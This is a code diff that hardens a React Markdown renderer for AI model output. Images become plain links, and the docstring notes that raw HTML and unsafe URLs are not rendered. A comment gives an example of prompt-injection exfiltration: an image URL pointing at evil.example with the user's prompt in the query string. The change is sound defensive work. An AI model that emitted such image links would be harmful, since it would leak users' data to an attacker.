@@ -14,6 +14,13 @@ const components: Components = {
         {children}
       </a>
     ),
+  // Never fetch images named in model output: a prompt-injected answer could use
+  // ![](https://evil.example/?q=<the user's prompt>) to send data out. Show a link instead.
+  img: ({ src, alt }) => (
+    <a href={typeof src === "string" ? src : undefined} target="_blank" rel="noreferrer noopener" className="text-primary underline underline-offset-2">
+      [image: {alt || "untitled"}]
+    </a>
+  ),
   table: ({ children }) => (
     <div className="my-2 overflow-x-auto">
       <table className="w-full border-collapse text-xs">{children}</table>
@@ -34,7 +41,12 @@ const components: Components = {
   blockquote: ({ children }) => <blockquote className="text-muted-foreground border-l-2 pl-3">{children}</blockquote>,
 };
 
-/** Model output as Markdown (GFM tables, lists, code). Raw HTML is not rendered. */
+/**
+ * Model output as Markdown (GFM tables, lists, code). Model output is untrusted:
+ * raw HTML is not rendered (react-markdown's default, no rehype-raw), link URLs
+ * go through react-markdown's default urlTransform (javascript: and data: are
+ * dropped), and images become links (above).
+ */
 export function Markdown({ text, citations = false, className }: { text: string; citations?: boolean; className?: string }) {
   return (
     <div className={cn("text-sm break-words [&>*:first-child]:mt-0", className)}>
